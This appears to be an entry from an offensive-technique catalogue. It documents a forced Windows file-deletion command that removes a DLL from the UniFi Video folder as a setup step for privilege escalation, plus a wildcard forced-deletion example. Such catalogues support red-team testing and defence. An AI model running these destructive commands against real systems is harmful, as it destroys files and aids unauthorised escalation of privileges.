---
id: 08eeb1f5-e0c2-4bf1-a4c1-f077d25e5144
name: delete-target-dll
type: command
executor: cmd
data: 'del /f "C:\\Program Files\\Ubiquiti UniFi Video\\example.dll"'
output: 1 file(s) deleted.
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:28:59.215Z'
platforms:
  - Windows
tags:
  - file-deletion
  - privilege-escalation
verified: false
validated: true
submitted: true
---

# delete-target-dll

## Command

```cmd
del /f "C:\Program Files\Ubiquiti UniFi Video\example.dll"
```

## Description

Deletes a target DLL file in the UniFi Video directory, exploiting weak permissions to remove critical files for escalation setup.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /f | Forces deletion of read-only files | Yes |
| Path | Full path to the target DLL | Yes |

## Examples

### Basic Usage

```cmd
del /f "C:\Program Files\Ubiquiti UniFi Video\example.dll"
```

### Advanced Usage

```cmd
del /f /q "C:\path\to\multiple\files.*"
```

## Expected Output

"The system cannot find the file specified." if already deleted, or "1 file(s) deleted." on success.

## Related

- [[Related Procedure: Exploit-Arbitrary-File-Deletion-in-UniFi-Video-tsExport-Folder]]
